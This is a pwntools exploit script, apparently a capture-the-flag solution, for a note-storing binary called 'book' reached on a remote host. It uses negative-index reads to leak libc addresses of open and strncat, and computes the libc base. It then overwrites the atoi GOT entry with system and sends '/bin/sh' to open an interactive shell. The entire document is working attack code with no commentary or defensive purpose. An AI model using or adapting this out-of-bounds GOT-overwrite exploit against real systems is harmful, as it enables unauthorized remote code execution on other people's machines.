#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './book'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc6_2.31-0ubuntu9.10_amd64.so'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '34.159.57.250', 31856 

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def print_entry(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'?', str(idx).encode())

    io.recvuntil(b'Your NOTE: ')
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    return leak

def store_entry(idx, payload):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'?', str(idx).encode())
    io.sendlineafter(b'?', payload)

def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    # init
    io.sendlineafter(b'user', b'asd')

    #  -4     -5      -6
    # open, strncat, write 
    _open = print_entry(-4)
    _strncat = print_entry(-5)
    libc.address = _open - libc.sym['open']

    # https://libc.rip/
    # libc6_2.31-0ubuntu9.10_amd64
    payload = flat([
        0,                     # open
        libc.sym['system']     # atoi
    ])
    store_entry(-4, payload)
    io.sendlineafter(b'>', b'/bin/sh\x00')

    info('leaked open: %#x', _open)
    info('leaked strncat: %#x', _strncat)
    info('libc base: %#x', libc.address)
    io.interactive()

if __name__ == '__main__':
    exploit()